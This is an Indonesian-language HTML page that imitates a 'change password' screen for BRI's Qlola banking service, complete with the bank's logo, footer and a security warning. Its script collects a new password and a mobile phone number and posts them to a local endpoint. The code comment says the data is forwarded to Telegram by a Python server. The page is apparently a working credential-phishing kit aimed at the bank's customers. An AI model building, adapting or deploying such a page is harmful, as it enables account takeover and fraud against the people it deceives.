<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ganti Kata Sandi - QLola</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
        body { background-color: #f5f5f5; display: flex; justify-content: center; min-height: 100vh; }
        .app-container { width: 100%; max-width: 480px; background-color: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
        .header { background-color: #050E21; padding: 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
        .lang-selector { display: flex; align-items: center; gap: 6px; font-size: 13px; padding: 6px 12px; border-radius: 6px; border: 1px solid rgba(255, 255, 255, 0.3); }
        .content { padding: 30px 24px; flex: 1; display: flex; flex-direction: column; }
        .logo-wrapper { text-align: center; margin-bottom: 30px; }
        .warning-box { background-color: #F2F9FC; border: 1px solid #B4D7E8; border-radius: 8px; padding: 16px; display: flex; gap: 12px; margin-bottom: 24px; }
        .warning-text { font-size: 13px; color: #1a1a1a; line-height: 1.5; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; font-size: 14px; font-weight: 600; color: #1a1a1a; margin-bottom: 8px; }
        .input-box { display: flex; align-items: center; border: 1px solid #D1D5DB; border-radius: 8px; padding: 12px 16px; background: #fff; }
        .input-box input { border: none; outline: none; width: 100%; font-size: 15px; }
        .phone-group { display: flex; gap: 12px; }
        .phone-prefix { display: flex; align-items: center; justify-content: center; border: 1px solid #D1D5DB; border-radius: 8px; padding: 0 16px; font-size: 15px; background: #F9FAFB; font-weight: 500; }
        .phone-input { flex: 1; }
        .btn { width: 100%; padding: 16px; border-radius: 8px; font-size: 16px; font-weight: 600; border: none; margin-top: 20px; transition: 0.3s; }
        .btn-disabled { background-color: #F3F4F6; color: #9CA3AF; cursor: not-allowed; }
        .btn-active { background-color: #00529C; color: white; cursor: pointer; }
        .footer { text-align: center; font-size: 11px; color: #6B7280; margin-top: auto; padding: 40px 0 20px; }
    </style>
</head>
<body>
    <div class="app-container">
        <header class="header">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
            <div class="lang-selector">ID <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg></div>
        </header>
        <main class="content">
            <div class="logo-wrapper">
                <svg viewBox="0 0 200 70" width="140" xmlns="http://www.w3.org/2000/svg">
                    <path d="M15 30 C15 12, 35 12, 45 12 C55 12, 60 18, 60 30 C60 42, 55 48, 45 48 L25 48 L38 60 L30 66 L10 44 Z" fill="none" stroke="#00529C" stroke-width="8" stroke-linejoin="round"/>
                    <text x="70" y="42" font-family="Arial" font-size="42" font-weight="bold" fill="#00529C" letter-spacing="-2">lola</text>
                    <text x="98" y="60" font-family="Arial" font-size="14" font-weight="bold" fill="#00529C">by BRI</text>
                </svg>
            </div>
            <div class="warning-box">
                <svg viewBox="0 0 24 24" stroke="#00529C" fill="none" stroke-width="2" width="24" height="24"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                <div class="warning-text"><b>Peringatan keamanan:</b> Anda diwajibkan untuk mengganti kata sandi Anda secara berkala. Pastikan kata sandi baru terdiri dari kombinasi huruf besar, huruf kecil, angka, dan karakter khusus minimal 8 karakter.</div>
            </div>
            <form id="resetForm">
                <div class="form-group">
                    <label>Kata Sandi Baru</label>
                    <div class="input-box"><input type="password" id="newPassword" placeholder="Masukkan kata sandi baru" required></div>
                </div>
                <div class="form-group">
                    <label>Ulangi Sandi Baru</label>
                    <div class="input-box"><input type="password" id="confirmPassword" placeholder="Ulangi kata sandi baru" required></div>
                </div>
                <div class="form-group">
                    <label>Nomor Telepon Genggam</label>
                    <div class="phone-group">
                        <div class="phone-prefix">+62</div>
                        <div class="input-box phone-input"><input type="tel" id="phoneNumber" placeholder="8XXX-XXXX-XXXX" required></div>
                    </div>
                </div>
                <button type="submit" id="btnLanjut" class="btn btn-active">Lanjutkan</button>
            </form>
        </main>
        <footer class="footer">PT. Bank Rakyat Indonesia (Persero) Tbk. · Qlola by BRI · 2026</footer>
    </div>
<script>
    const form = document.getElementById('resetForm');
    const newPassword = document.getElementById('newPassword');
    const confirmPassword = document.getElementById('confirmPassword');
    const phoneNumber = document.getElementById('phoneNumber');
    const btnLanjut = document.getElementById('btnLanjut');

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // --- 1. VALIDASI FORM ---
        if (newPassword.value.length < 8) {
            alert('Gagal: Kata sandi minimal harus 8 karakter!');
            return; // Hentikan proses
        }
        if (newPassword.value !== confirmPassword.value) {
            alert('Gagal: Kata sandi baru dan ulangi sandi baru TIDAK COCOK!');
            return; // Hentikan proses
        }
        if (phoneNumber.value.trim() === '') {
            alert('Gagal: Nomor telepon tidak boleh kosong!');
            return; // Hentikan proses
        }

        // --- 2. JIKA VALID, KIRIM KE TELEGRAM (VIA PYTHON) ---
        btnLanjut.textContent = 'Memproses...';
        btnLanjut.disabled = true;

        try {
            const res = await fetch('/api/reset', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    newPassword: newPassword.value, 
                    phone: phoneNumber.value 
                })
            });

            if (res.ok) {
                alert('✅ Kata sandi berhasil diperbarui!');
                window.location.href = 'dashboard.html';
            } else {
                alert('❌ Gagal dari server. Cek Token/ID di server.py');
                btnLanjut.textContent = 'Lanjutkan'; 
                btnLanjut.disabled = false;
            }
        } catch (err) {
            alert('❌ Gagal terhubung ke server Python. Pastikan server.py sedang berjalan (python server.py).');
            btnLanjut.textContent = 'Lanjutkan'; 
            btnLanjut.disabled = false;
        }
    });
</script>	
</body>
</html>
